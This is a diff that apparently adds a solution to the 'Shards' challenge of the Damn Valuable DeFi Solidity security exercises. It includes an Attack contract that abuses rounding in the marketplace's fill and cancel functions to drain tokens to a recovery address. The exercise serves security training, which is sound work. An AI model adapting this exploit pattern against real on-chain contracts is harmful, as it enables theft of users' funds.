@@ -11,8 +11,12 @@ import {
     DamnValuableNFT
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
+
 
 contract ShardsChallenge is Test {
+    using FixedPointMathLib for uint256;
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address seller = makeAddr("seller");
@@ -113,7 +117,14 @@ contract ShardsChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_shards() public checkSolvedByPlayer {}
+    function test_shards() public checkSolvedByPlayer {
+        Attack attack = new Attack(token, marketplace, recovery);
+        attack.attack();
+    }
+
+    function toDVT(uint256 _value, uint256 _rate) public pure returns (uint256) {
+        return _value.mulDivDown(_rate, 1e6);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -132,5 +143,38 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract Attack {
+    DamnValuableToken token;
+    DamnValuableNFT nft;
+    ShardsFeeVault feeVault;
+    ShardsNFTMarketplace marketplace;
+    DamnValuableStaking staking;
+    address recovery;
+
+    uint256 constant STAKING_REWARDS = 100_000e18;
+    uint256 constant NFT_SUPPLY = 50;
+    uint256 constant SELLER_NFT_BALANCE = 1;
+    uint256 constant SELLER_DVT_BALANCE = 75e19;
+    uint256 constant STAKING_RATE = 1e18;
+    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
+    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
+    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;
+    
+    constructor(DamnValuableToken _token, ShardsNFTMarketplace _marketplace, address _recovery) {
+        token = _token;
+        marketplace = _marketplace;
+        recovery = _recovery;
+    }        
+
+    function attack() external {
+        token.approve(address(marketplace), type(uint256).max);
+        marketplace.fill(1, NFT_OFFER_SHARDS / 75e21);
+        marketplace.cancel(1,0);
+        marketplace.fill(1, NFT_OFFER_SHARDS / 11e14);
+        marketplace.cancel(1,1);
+        token.transfer(address(recovery), token.balanceOf(address(this)));
     }
 }
